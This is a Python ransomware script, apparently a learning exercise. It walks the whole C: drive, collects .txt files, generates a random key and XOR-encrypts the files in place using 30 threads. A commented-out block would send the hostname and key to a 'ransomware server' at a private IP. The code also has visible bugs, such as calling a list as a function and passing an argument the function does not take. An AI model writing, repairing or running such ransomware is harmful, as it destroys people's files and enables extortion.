# put a safeguard at beginning or programming for testing purpose
# supply file extension to encrypt
# grab all files from machine and put them in a list
# generate key
# grab host name
# send hostname and key back to the server
# encrypt all files in the list

import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

# Safeguard password
safeguard = input("enter the safeguard password: ")
if safeguard != 'start':
    quit()

# file extensions to encrypt
encrypted_ext = '.txt'

# grab all the files from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root + '\\' + file)
        if file_ext in encrypted_ext:
            file_paths.append(root + '\\' + file)

for i in file_paths:
    print(i)

# Generate key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))

for i in range(encryption_level):
    key += random.choice(char_pool)
'''
hostname = os.getenv('COMPUTERNAME')

# Connect to the ransomware server and send hostname and key
ip_address = '192.168.137.51'
port = 5678
time = datetime.now()
print(time)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(ip_address)
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))
'''


# Encrypting files
def encrypt():
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1

        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f'failed to encrypt {file}')
        q.task_done()


q = Queue()
for file in file_paths():
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print("Encryption done successfully !")
